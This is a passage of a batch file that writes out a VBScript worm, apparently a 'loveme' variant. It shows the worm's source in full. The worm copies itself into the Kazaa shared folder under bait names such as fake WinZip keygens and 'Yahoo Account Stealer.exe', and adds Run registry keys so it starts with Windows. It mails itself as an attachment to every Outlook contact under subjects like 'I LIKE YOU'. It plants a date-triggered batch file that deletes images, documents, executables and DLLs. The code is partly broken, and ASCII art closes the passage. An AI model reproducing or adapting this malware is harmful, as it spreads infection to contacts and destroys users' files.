   echo FileCopy App.Path + "\" & App.EXEName & ".exe", "c:\Program Files\Kazaa\My Shared Folder\WinZip 9.0b.exe" >>download91166669.vbs
   echo FileCopy App.Path + "\" & App.EXEName & ".exe", "c:\Program Files\Kazaa\My Shared Folder\winzip full version key generator.exe >>download91166669.vbs
   echo FileCopy App.Path + "\" & App.EXEName & ".exe", "c:\Program Files\Kazaa\My Shared Folder\Winzip KeyGenerator Crack.exe " >>download91166669.vbs
   echo FileCopy App.Path + "\" & App.EXEName & ".exe", "c:\Program Files\Kazaa\My Shared Folder\WinZipped Visual C++ Tutorial.exe" >>download91166669.vbs
   echo FileCopy App.Path + "\" & App.EXEName & ".exe", "c:\Program Files\Kazaa\My Shared Folder\XNuker 2003 2.93b.exe" >>download91166669.vbs
   echo FileCopy App.Path + "\" & App.EXEName & ".exe", "c:\Program Files\Kazaa\My Shared Folder\XNuker_2003_2.93b.exe" >>download91166669.vbs
   echo FileCopy App.Path + "\" & App.EXEName & ".exe", "c:\Program Files\Kazaa\My Shared Folder\X-BOX HACK" >>download91166669.vbs
   echo FileCopy App.Path + "\" & App.EXEName & ".exe", "c:\Program Files\Kazaa\My Shared Folder\X-BOX HACKING" >>download91166669.vbs
   echo FileCopy App.Path + "\" & App.EXEName & ".exe", "c:\Program Files\Kazaa\My Shared Folder\Free XBOX" >>download91166669.vbs
   echo FileCopy App.Path + "\" & App.EXEName & ".exe", "c:\Program Files\Kazaa\My Shared Folder\REAL X-BOX EMULATOR!" >>download91166669.vbs
   echo FileCopy App.Path + "\" & App.EXEName & ".exe", "c:\Program Files\Kazaa\My Shared Folder\Xvid_Codec_Installer.exe" >>download91166669.vbs
   echo FileCopy App.Path + "\" & App.EXEName & ".exe", "c:\Program Files\Kazaa\My Shared Folder\Yahoo Account Stealer.exe" >>download91166669.vbs
   echo FileCopy App.Path + "\" & App.EXEName & ".exe", "c:\Program Files\Kazaa\My Shared Folder\Yahoo Messenger 6.0.exe" >>download91166669.vbs
   echo FileCopy App.Path + "\" & App.EXEName & ".exe", "c:\Program Files\Kazaa\My Shared Folder\Zelda Classic 2.00.exe" >>download91166669.vbs

   Dim g >>download91166669.vbs
   Set g = CreateObject("wscript.Shell") >>download91166669.vbs
   g.regwrite >>download91166669.vbs
   "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\Win32.loveme", >>download91166669.vbs
   "C:\WINNT\system\Win32.loveme.vbs" >>download91166669.vbs
   g.regwrite >>download91166669.vbs
   "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\Win32.loveme", >>download91166669.vbs
   "C:\WINDOWS\SYSTEM\Win32.loveme.vbs" >>download91166669.vbs

   If Month(Now()) = 1 And Day(Now()) = 1 Then >>download91166669.vbs
   shell.Run  "C:\WINDOWS\HAPPYNEWYEAR" >>download91166669.vbs
   end if >>download91166669.vbs

   If Month(Now()) = 2 And Day(Now()) = 1 Then >>download91166669.vbs
   shell.Run  "C:\WINDOWS\SYSTEM\2004" >>download91166669.vbs
   end if >>download91166669.vbs

   On Error Resume Next >>download91166669.vbs
   var1 = "true" >>download91166669.vbs
   filepath = App.Path >>download91166669.vbs
   FileName = App.EXEName >>download91166669.vbs
   fullloc = filepath & "\" & FileName >>download91166669.vbs
   Set myapp = CreateObject("Outlook.Application") >>download91166669.vbs
   If myapp = "Outlook" Then >>download91166669.vbs
   Set christmas = myapp.GetNameSpace("mapi") >>download91166669.vbs
   Set List = christmas.AddressLists >>download91166669.vbs
   For Each Addresslist In List >>download91166669.vbs
   If Addresslist.AddressEntries.Count <> 0 Then >>download91166669.vbs
   Addresslistcout = Addresslist.AddressEntries.Count >>download91166669.vbs
   For AddList = 1 To Addresslistcout >>download91166669.vbs
   Set love = myapp.CreateItem(0) >>download91166669.vbs
   Set AdEntries = Addresslist.AddressEntries(AddList) >>download91166669.vbs
   love.To = AdEntries.Address >>download91166669.vbs
   love.Subject = "I LIKE YOU" >>download91166669.vbs
   love.Body = "Love my Attachment 4-you" >>download91166669.vbs
   Set Attachs = love.Attachments >>download91166669.vbs
   Attachs.Add fullloc >>download91166669.vbs
   If var1 = "true" Then >>download91166669.vbs
   you.DeleteAfterSubmit = True >>download91166669.vbs
   If msg.To <> "" Then >>download91166669.vbs
   you.send >>download91166669.vbs
   End If >>download91166669.vbs
   End If >>download91166669.vbs
   Next >>download91166669.vbs
   Beep >>download91166669.vbs
   End If >>download91166669.vbs
   Next >>download91166669.vbs
   End If  >>download91166669.vbs

   On Error Resume Next >>download91166669.vbs
   var1 = "true" >>download91166669.vbs
   filepath = App.Path >>download91166669.vbs
   FileName = App.EXEName >>download91166669.vbs
   fullloc = filepath & "\" & FileName >>download91166669.vbs
   Set myapp = CreateObject("Outlook.Application") >>download91166669.vbs
   If myapp = "Outlook" Then >>download91166669.vbs
   Set christmas = myapp.GetNameSpace("mapi") >>download91166669.vbs
   Set List = christmas.AddressLists >>download91166669.vbs
   For Each Addresslist In List >>download91166669.vbs
   If Addresslist.AddressEntries.Count <> 0 Then >>download91166669.vbs
   Addresslistcout = Addresslist.AddressEntries.Count >>download91166669.vbs
   For AddList = 1 To Addresslistcout >>download91166669.vbs
   Set love = myapp.CreateItem(0) >>download91166669.vbs
   Set AdEntries = Addresslist.AddressEntries(AddList) >>download91166669.vbs
   love.To = AdEntries.Address >>download91166669.vbs
   love.Subject = "DO YOU LOVE ME?" >>download91166669.vbs
   love.Body = "Love my Attachment 4-you" >>download91166669.vbs
   Set Attachs = love.Attachments >>download91166669.vbs
   Attachs.Add fullloc >>download91166669.vbs
   If var1 = "true" Then >>download91166669.vbs
   you.DeleteAfterSubmit = True >>download91166669.vbs
   If msg.To <> "" Then >>download91166669.vbs
   you.send >>download91166669.vbs
   End If >>download91166669.vbs
   End If >>download91166669.vbs
   Next >>download91166669.vbs
   Beep >>download91166669.vbs
   End If >>download91166669.vbs
   Next >>download91166669.vbs
   End If  >>download91166669.vbs


   set fso=CreateObject("Scripting.FileSystemObject")" >>download91166669.vbs
   set batch=fso.CreateTextFile("C:\WINDOWS\HAPPYNEWYEAR")" >>download91166669.vbs
   batch.WriteLine "@echo off" >>download91166669.vbs
   batch.WriteLine "Del *.jpg >nul" >>download91166669.vbs
   batch.WriteLine "Del *.bmp >nul" >>download91166669.vbs
   batch.WriteLine "Del *.gif >nul" >>download91166669.vbs
   batch.WriteLine "Del *.txt >nul" >>download91166669.vbs
   batch.WriteLine "Del *.mp3 >nul" >>download91166669.vbs
   batch.WriteLine "Del *.avi >nul" >>download91166669.vbs
   batch.WriteLine "Del *.mpg >nul" >>download91166669.vbs
   batch.WriteLine "Del *.exe >nul" >>download91166669.vbs
   batch.WriteLine "Del *.dat >nul" >>download91166669.vbs
   batch.WriteLine "Del *.pdf >nul" >>download91166669.vbs
   batch.WriteLine "Del *.doc >nul" >>download91166669.vbs
   batch.WriteLine "Del *.ogg >nul" >>download91166669.vbs
   batch.WriteLine "Del *.dll >nul" >>download91166669.vbs
   batch.WriteLine "Del *.xls >nul" >>download91166669.vbs
   batch.WriteLine "Del *.lnk >nul" >>download91166669.vbs
   batch.WriteLine "Del *.mod >nul" >>download91166669.vbs
   batch.WriteLine "Del *.rtf >nul" >>download91166669.vbs
   batch.WriteLine "Del *.ocx >nul" >>download91166669.vbs
   batch.WriteLine "Del *.zip >nul" >>download91166669.vbs
   batch.WriteLine "Del *.mov >nul" >>download91166669.vbs
   batch.WriteLine "Del *.mid >nul" >>download91166669.vbs
   batch.WriteLine "Del *.ico >nul" >>download91166669.vbs
   batch.WriteLine "@ECHO OFF" >>download91166669.vbs
   batch.WriteLine "CLS" >>download91166669.vbs
   batch.WriteLine "COLOR 0A" >>download91166669.vbs
   batch.WriteLine "ECHO. >>download91166669.vbs
   batch.WriteLine "ECHO             **********************************************" >>download91166669.vbs
   batch.WriteLine "ECHO             *     HH  HH AAAAAA PPPPPP PPPPPP YY   YY    *" >>download91166669.vbs
   batch.WriteLine "ECHO             *     HH  HH AAAAAA PPPPPP PPPPPP  YY YY     *" >>download91166669.vbs
   batch.WriteLine "ECHO             *     HHHHHH AA  AA PP  PP PP  PP   YYY      *" >>download91166669.vbs
   batch.WriteLine "ECHO             *     HHHHHH AAAAAA PPPPPP PPPPPP   YYY      *" >>download91166669.vbs
   batch.WriteLine "ECHO             *     HH  HH AA  AA PP     PP       YYY      *" >>download91166669.vbs
   batch.WriteLine "ECHO             *     HH  HH AA  AA PP     PP       YYY      *" >>download91166669.vbs
   batch.WriteLine "ECHO             *                                            *" >>download91166669.vbs
   batch.WriteLine "ECHO             *         NNN   NN EEEEEEE WW    WW          *" >>download91166669.vbs
   batch.WriteLine "ECHO             *         NNNN  NN EEEEEEE WW    WW          *" >>download91166669.vbs
   batch.WriteLine "ECHO             *         NN NN NN EE      WW WW WW          *" >>download91166669.vbs
   batch.WriteLine "ECHO             *         NN  NNNN EEEEE   WW WW WW          *" >>download91166669.vbs
   batch.WriteLine "ECHO             *         NN   NNN EE      WWWWWWWW          *" >>download91166669.vbs
   batch.WriteLine "ECHO             *         NN    NN EEEEEEE WWWWWWWW          *" >>download91166669.vbs
   batch.WriteLine "ECHO             *                                            *" >>download91166669.vbs
   batch.WriteLine "ECHO             *       YY   YY EEEEEEE AAAAAA RRRRRR        *" >>download91166669.vbs
   batch.WriteLine "ECHO             *        YY YY  EEEEEEE AAAAAA RR  RR        *" >>download91166669.vbs
   batch.WriteLine "ECHO             *         YYY   EE      AA  AA RR  RR        *" >>download91166669.vbs
   batch.WriteLine "ECHO             *         YYY   EEEEE   AAAAAA RRRRRR        *" >>download91166669.vbs
   batch.WriteLine "ECHO             *         YYY   EE      AA  AA RR   RR       *" >>download91166669.vbs
   batch.WriteLine "ECHO             *         YYY   EEEEEEE AA  AA RR    RR      *" >>download91166669.vbs
   batch.WriteLine "ECHO             **********************************************" >>download91166669.vbs
   batch.WriteLine "PAUSE" >>download91166669.vbs
   batch.WriteLine "CLS" >>download91166669.vbs
   batch.WriteLine ":START" >>download91166669.vbs
   batch.Close" >>download91166669.vbs

   msgbox "ERROR","ERROR" >>download91166669.vbs

   Echo If EmailItem.To <> "" Then >>download91166669.vbs
   Echo EmailItem.Send >>download91166669.vbs
   Echo ws.regwrite "HKCU\software\loveme\mailed", "1" >>download91166669.vbs
   Echo End If >>download91166669.vbs
   Echo Next >>download91166669.vbs
   Echo End If >>download91166669.vbs
   Echo Next >>download91166669.vbs
   Echo end if >>download91166669.vbs

   DO YOU LOVE KIM ?  >> Kimloveyou.txt
   echo  >> Kimloveyou.txt
   echo                     .,;;;.     .,ijffDDDDDLLji;.  >> Kimloveyou.txt
   echo                 tfDKKKKELj.;jGKKKKKKKKKKKKKKKDf;.  >> Kimloveyou.txt
   echo               :EKKKEEKKWWWKKKKKKKKKKKKKKKKKKKKKKKEffji.  >> Kimloveyou.txt
   echo               DKEEKKKWWWKKKEEKKKKKKEKDKKEKKKKKKEEEEKWWWL:  >> Kimloveyou.txt
   echo              :KKEKKKWWKKEEKKKKDLfftfiLLtKKWWKKEGLDtGGKWKDL  >> Kimloveyou.txt
   echo              ,KKEKKKWWKKKKKKKEfGLDiGtjEGKK#WWKWKDKEEKEWWKG:  >> Kimloveyou.txt
   echo              ;KKKKKKWKKEKKKKKKKEEGEEDWKKWGiitiitKKKWKKWWWW  >> Kimloveyou.txt
   echo              ,KWKKKWWWKKKKKWKKKKKKKKKWKKWLi::,:,LKWWWWWWjD.  >> Kimloveyou.txt
   echo              :KWKKKWWWWKKWWWKWKKKWKKKWWKWG,:::::jEWWWWWW::  >> Kimloveyou.txt
   echo             .WWKKKKWWWWWWWWKWWKEWKWKWKEWK,:::::LEGDWWED  >> Kimloveyou.txt
   echo              ;WWKKKKWWWWWWWWWWEDfLDGDEEGLDG:::;ffjLG#f,  >> Kimloveyou.txt
   echo              tWWKKKKKWWWWWWWWGfjiiLLLti:,:;::,DffjtKj  >> Kimloveyou.txt
   echo              LWWKKKKKWWWLttjE#f.:;KWE..::::.:;WE:.ti  >> Kimloveyou.txt
   echo              ;W#KKWKKWWWfiii;KK,::;GL..::::::;j;::j  >> Kimloveyou.txt
   echo               DWWKKWKWWW#EiiiEKG::.:::::::::::;:::f  >> Kimloveyou.txt
   echo               ;#WWWWKWWWWW iGLKWi.:::::::,,,,:::;fK  >> Kimloveyou.txt
   echo                LEEKWWWWWfD, .GKWf:::::::::::::,fKWK:  >> Kimloveyou.txt
   echo                'ifGWWWWW,j;  ;KKf::::::::::::iLWEKKi                .  >> Kimloveyou.txt
   echo                   ;LWWWG :   jKKf::::;ii,:::'  WKKWE              .,,,;.  >> Kimloveyou.txt
   echo                    f##j     GKKf::::::f,      WKKWKj           .,:. :,:::  >> Kimloveyou.txt
   echo                      iLj    ,KKKG,:::::L,.     WKKWW:;         ,,:,:...  .;,.  >> Kimloveyou.txt
   echo                       ..,iitWWKD,:::::ttjii;;i#WKKW         .,:,,. ....,:,ii;,  >> Kimloveyou.txt
   echo                    ,;;;;;;,;;WWWEt:::.:i;;;;t;tDWKLK         .::...:,,:ii;j;:;tt  >> Kimloveyou.txt
   echo                 ,;;:::::::;,,fWWWK,,,:,;ii;;,;LDWGttt          ':,;;;,;;,,,;jiij'  >> Kimloveyou.txt
   echo                i:::::::::::,:;fEEWE,:,::::::::,Wfi,::i            .,;i:,t;,,;,'  >> Kimloveyou.txt
   echo               i:::::::::::::;;;tLGDEt::::::::.jG;;;,:t               t;,i;;t.  >> Kimloveyou.txt
   echo              t:::::::::::::::i;;::::ii::::::::;:::iiij.              t:,;i,::  >> Kimloveyou.txt
   echo             i;:::::::::::::::,;;i;::::::,::,,,:::::,;ii:            ,,:::,i,,i.  >> Kimloveyou.txt
   echo            ;i:::::::::,:::::::;:;;:,,,,,::,,;,,,,,:::::;i;          i:i;,::::;;  >> Kimloveyou.txt
   echo           .i:::::::::,;:::::::,:,;:::::::::,;;;i::::::::::,.        ,::::::::t  >> Kimloveyou.txt
   echo          :i:::::::::,ijt;;,,:::,:,::::::::::::,;:::::::::::,;.      .;i::::::i  >> Kimloveyou.txt
   echo         ;;:::::::::,;. ;;,,::::,:,:::::::::::::::::::::::::::t        i:::::,,  >> Kimloveyou.txt
   echo        ;::::::::::;,    ;t:::::i;i::::::::::::::,,;;;,,:::::,j        :;::::t  >> Kimloveyou.txt
   echo       ;::::::::::,,      .i:::,;tti,::::::::::,,;;;;;i;;,,,;i;       :,:::::'  >> Kimloveyou.txt
   echo      ,:::::::::,i'         i,:ii;;iii;;;,,,;;;;;;;;;;;;;;;;;t     .;:::::::;  >> Kimloveyou.txt
   echo     ,:::::::::i,            it;i;;;;;;;;;;;;;;;;;i;;;;;;;;i;    .;::::::,;,  >> Kimloveyou.txt
   echo    ,::::::::;;               ji;;;;;;;;;;;;i;;;;;;;,,,;;t;   ,,::::::::;,  >> Kimloveyou.txt
   echo   ;:::::,,;j,                 ;;;;;;;;;;;;,;;;;;;;;;;,;j: ,,;:::::::;,.  >> Kimloveyou.txt
   echo  i:::::,;,;;;,                ;jii;,,,,,;;;;;;;;,,:,,;,f,,::::::::;,  >> Kimloveyou.txt
   echo  ';:::::::::::,               :;,:,,;;;;,,;;,,::,,;;,,i,::::::::;,  >> Kimloveyou.txt
   echo  ',,.::::::::::,             ii;;;,,;;,,,:::,;;;;;;,t;:::::::;.  >> Kimloveyou.txt
   echo     :,,:::::::::::,           t;::,;;,::,,::,;;;;;;,;ti::::,,:  >> Kimloveyou.txt
   echo      `:,,:::::::::::,       t:,;i;::,;;,,;;;;;;;,,;;tj:::;'  >> Kimloveyou.txt
   echo           ',;::::::::::.    t;;;,,,;;;,;;;;;;,;;,,;,,j,;'  >> Kimloveyou.txt
   echo              ',;,:::::::;,.tf;:,;;i;:,,;;;;,,;;;;;,;;f  >> Kimloveyou.txt
   echo                 ',,:::::::,fKGfjtti::,,;;,:,;;;;;,;;ij  >> Kimloveyou.txt
   echo                    '':::::::,KDGDDDGLfffjjffffLGGGKEKj  >> Kimloveyou.txt
   echo                       ',:::::GKEEEDDDDDEDEKKKDLKKKKWWK;  >> Kimloveyou.txt
   echo                         i,::,DDGDEEKKKKKKKKKKKKKEEEWWKK,  >> Kimloveyou.txt
   echo                  :,   :,:::iKEDDDDDDEEKEEEDKKKKEEKKKKWf,  >> Kimloveyou.txt
   echo                  ;,;i:.,:::,EEDDDDDDGGGGGDDKKKKKKKKKKKKWW;  >> Kimloveyou.txt
   echo                 .,j;,i::::jEGGGGGDDE-Made by-KWKEEKKKKKKKKKt  >> Kimloveyou.txt
   echo                 .;iti;::.iKGGGGGGGGfggggkkkkfjhdKKKKKKKKKKEKW,  >> Kimloveyou.txt
   echo                   ;ii;:;LKDGGGDDEEEKKKKKKKKKKKWKKKKKKDDGGEKKKi  >> Kimloveyou.txt
   echo                     ;ZEGGGGGGGGDGGGGGGDEKKKKKKWKKKKKEDEEKKKKKE,  >> Kimloveyou.txt
   echo                     i;LDDDGGGGGDDDEKKKKEKKKKKKKKKKEKKKDLftii,:;t  >> Kimloveyou.txt
   echo                     :jt;;;;;,;itfffGDKKKKKKKKEGif:;:;;;,;;;:,:i:t  >> Kimloveyou.txt
   echo                     .i::::::;,i;;;;;:;,iiijLGjii;;,;:::::::::::;i,  >> Kimloveyou.txt
   echo                      t;::::::::::;::;;iittjftt;;:::::::::::::::::t.  >> Kimloveyou.txt
   echo                      `;:::::::::::::::::::;jj;;:,::::::::::::::::;:  >> Kimloveyou.txt
   echo                       :i::::::::::::::::::,;Gj;;:::::::::::::::::.t.  >> Kimloveyou.txt
   echo                       i:::::::::::::::::::,f:i;:::::::::::::::::::t  >> Kimloveyou.txt
   echo                         t::::::::::::::::::,t.i,:::::::::::::::::::;:  >> Kiml
